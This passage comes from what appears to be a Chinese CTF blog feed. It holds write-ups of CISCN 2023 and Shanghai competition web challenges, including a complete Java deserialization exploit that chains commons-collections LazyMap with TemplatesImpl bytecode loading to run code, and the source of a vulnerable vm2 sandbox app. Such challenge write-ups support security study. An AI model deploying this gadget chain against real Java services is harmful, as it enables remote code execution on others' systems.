class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setName</span>(String name) &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230529212400523.png" alt="image-20230529212400523"></p><p>如何导入到idea中开始分析</p><p>这里的话先写一个恶意类</p><p><strong>Evil.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后写一个poc进行利用</p><p><strong>TmpTest.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TmpTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">        myexpect.setTargetclass(Evil.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;whatever&quot;</span>, myexpect);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的内容是跟据题目后半段给出的提示得出的结论</p><p>然后跟了一下他的执行流程</p><p><img src="../images/image-20230529214233881.png" alt="image-20230529214233881"></p><p>最后是在这执行我们的恶意类的，至于怎么执行的我没跟进去，因为尝试了一下，发现太多了，跟不过来</p><p>接下来我们就找谁调用了这个<code>jsonObject.put()</code>方法</p><p>这里话是给了一个<code>cc链</code>的一个jar包  我们可以去考虑一下是否存在利用链可以调用这个put方法</p><p><img src="../images/image-20230529215754130.png" alt="image-20230529215754130"></p><p>发现这里<code>JSONObjetc.class</code>这个类里边引用了别的类，这<code>Map</code>刚好和cc链里边的东西对应上，因为cc链里面也是有很多用到<code>Map</code></p><p><img src="../images/image-20221010090837206-16853688281281.png" alt="img"></p><p>根据这张对cc链总结的图片</p><p>我们据此可以联想到一个很特殊的<code>Map</code>—<code>org.apache.commons.collections.map.LazyMap</code>。</p><p><img src="../images/image-20230529220631061.png" alt="image-20230529220631061"></p><p>这里话刚好可以调用到</p><p>(这里的map在序列化的时候可控,并且key可控，value也可控)</p><p>因为cc链都是和<code>transform</code>有关，再加上这里存在，所以刚好可以利用这里来控制这个<code>value</code></p><p><img src="../images/image-20230529220919526.png" alt="image-20230529220919526"></p><p><code>factory</code>也可控</p><p>那么根据图上的内容—-&gt;<code>cc链</code>   只要我们能调用到<code>LazyMap.get</code>方法就行，那么就有好几种方法来进行调用了</p><p>因为有好几种链的组合</p><p>这里的话就先讲一种，就是利用<code>cc6</code>这条链子来</p><p><strong>DeserExp.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserExp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CTFLearning\\JackSonPOJO\\target\\classes\\org\\example\\b.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fuck&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Myexcpt</span> <span class="variable">myexcpt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexcpt</span>();</span><br><span class="line">        myexcpt.setTargetclass(com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.class);</span><br><span class="line">        myexcpt.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;);</span><br><span class="line">        myexcpt.setTypearg(<span class="keyword">new</span> <span class="title class_">Templates</span>[]&#123;templatesimpl&#125;);</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(jsonObject,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        jsonObject.remove(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazymap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(myexcpt));</span><br><span class="line">        System.out.println(serial(hashMap));</span><br><span class="line">        <span class="comment">//deserial(serial(hashMap));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">cserialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">cunserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个exp的话是利用<code>cc6</code>和<strong>动态类加载</strong>这两个执行方法来进行的(<strong>因为题目给的提示</strong>)</p><p>(这里的不用<code>InvokerTransfomer</code>的原因是这个版本是3.2.2，搬掉了3.2.1版本的<code>InvokerTransfomer</code>)</p><p><img src="../images/image-20230530162437944.png" alt="image-20230530162437944"></p><p>所以就剩最后这里可以进行调用了</p><p><img src="../images/image-20230530154121909.png" alt="image-20230530154121909"></p><p>所以这里就会用到动态类加载</p><p>这个exp好多东西都是固定的，只要修改一下让<code>LazyMap.get()</code>触发到<code>JSONObject.put()</code>方法就行了</p><p><img src="../images/image-20230530160454285.png" alt="image-20230530160454285"></p><p>这里的话就刚好可以执行到这一步，那么就可以成功进行恶意代码的执行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;都是参考别人的wp做的复现&lt;/p&gt;
&lt;h2 id=&quot;Unzip-软链接&quot;&gt;&lt;a href=&quot;#Unzip-软链接&quot; class=&quot;headerlink&quot; title=&quot;Unzip(软链接)&quot;&gt;&lt;/a&gt;Unzip(软链接)&lt;/h2&gt;&lt;p&gt;upload.php&lt;/p&gt;
&lt;fig</summary>
      
    
    
    
    
    <category term="ciscn-2023-web" scheme="https://ke1nys.github.io/tags/ciscn-2023-web/"/>
    
  </entry>
  
  <entry>
    <title>show-sql注入</title>
    <link href="https://ke1nys.github.io/posts/913f001f.html"/>
    <id>https://ke1nys.github.io/posts/913f001f.html</id>
    <published>2023-05-29T02:50:18.000Z</published>
    <updated>2023-05-31T13:47:45.670Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="57017d4ab20bf6199a989222a9600a362b25724231aa36e1e867d8638d98ff55"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-sql注入" scheme="https://ke1nys.github.io/tags/show-sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>show-文件上传</title>
    <link href="https://ke1nys.github.io/posts/fb2e5b27.html"/>
    <id>https://ke1nys.github.io/posts/fb2e5b27.html</id>
    <published>2023-05-25T12:30:41.000Z</published>
    <updated>2023-06-03T06:17:43.675Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cfccd782e60840a2cfcca0753acd33d7e0e1ffad4556d091fbd7fe78ee518ea1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-文件上传" scheme="https://ke1nys.github.io/tags/show-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>show-文件包含</title>
    <link href="https://ke1nys.github.io/posts/93915e83.html"/>
    <id>https://ke1nys.github.io/posts/93915e83.html</id>
    <published>2023-05-24T02:32:09.000Z</published>
    <updated>2023-05-25T13:11:41.184Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="1eb400062c440847fd27419525628884f75f8f988dcb32490147332db042f29f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-文件包含" scheme="https://ke1nys.github.io/tags/show-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>上海磐石行动-web-2023</title>
    <link href="https://ke1nys.github.io/posts/d4cd86c8.html"/>
    <id>https://ke1nys.github.io/posts/d4cd86c8.html</id>
    <published>2023-05-23T12:17:07.000Z</published>
    <updated>2023-05-25T13:11:41.187Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://fushuling.com/index.php/2023/05/21/%e7%ac%ac%e5%85%ab%e5%b1%8a%e4%b8%8a%e6%b5%b7%e5%b8%82%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8%e5%a4%a7%e8%b5%9b%e6%9a%a8%e7%a3%90%e7%9f%b3%e8%a1%8c%e5%8a%a820/">参考wp</a></p><h2 id="CookieBack"><a href="#CookieBack" class="headerlink" title="CookieBack"></a>CookieBack</h2><p>题目</p><p><img src="../images/image-20230523201738862.png" alt="image-20230523201738862"></p><p>这题太傻逼了，我以为得需要用这个搜索框来查出一些东西来解题，一直卡在这个思路上面</p><p><img src="../images/image-20230523201839121.png" alt="image-20230523201839121"></p><p>其实这里说的偷cookie，其实就是把自己的cookie传进去就行了…….</p><p><img src="../images/image-20230523202009372.png" alt="image-20230523202009372"></p><p>特别的离谱……….</p><h2 id="easy-node"><a href="#easy-node" class="headerlink" title="easy_node"></a>easy_node</h2><p>这是个nday的题目</p><p>访问/src就能拿到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line">session_secret = <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>(<span class="number">36</span>).<span class="title function_">substr</span>(<span class="number">2</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>(session_secret));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123; <span class="attr">secret</span>: session_secret, <span class="attr">resave</span>: <span class="literal">true</span>, <span class="attr">saveUninitialized</span>: <span class="literal">true</span> &#125;))</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyArray</span>(<span class="params">arr1</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="title class_">Array</span>(arr1.<span class="property">length</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr1.<span class="property">length</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr1[i] <span class="keyword">instanceof</span> <span class="title class_">Object</span>)&#123;</span><br><span class="line">            arr2[i] = <span class="title function_">copyArray</span>(arr1[i])</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            arr2[i] = arr1[i]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vm2_tester&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">name</span>) &#123;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span> = &#123;<span class="string">&quot;username&quot;</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;</span><br><span class="line">        <span class="keyword">const</span> properties = req.<span class="property">body</span>.<span class="property">properties</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (properties[i] == <span class="string">&#x27;vm2_tester&#x27;</span>) &#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;cant set vm2_tester by self&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span> = <span class="title function_">copyArray</span>(properties)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;Success&#x27;</span>)</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;input username&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/vm2&#x27;</span>,<span class="keyword">function</span>  (<span class="params">req, res</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span> &amp;&amp; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>.<span class="property">length</span>; i++)</span><br><span class="line">            <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">properties</span>[i] == <span class="string">&#x27;vm2_tester&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>]) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\b(?:function)\b/</span>.<span class="title function_">test</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(<span class="string">&quot;define function not allowed&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="regexp">/\b(?:getPrototypeOf)\b/</span>.<span class="title function_">test</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>])) &#123;</span><br><span class="line">                        res.<span class="title function_">send</span>(<span class="string">&quot;define getPrototypeOf not allowed&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title function_">VM</span>();</span><br><span class="line">                    res.<span class="title function_">send</span>(vm.<span class="title function_">run</span>(req.<span class="property">body</span>[<span class="string">&quot;code&quot;</span>]))</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">                    res.<span class="title function_">send</span>(<span class="string">&quot;input code&quot;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;not vm2 tester rights&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;see `/src`,use vm2 3.9.16&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> data = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;app.js&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(data.<span class="title function_">toString</span>());</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523202607587.png" 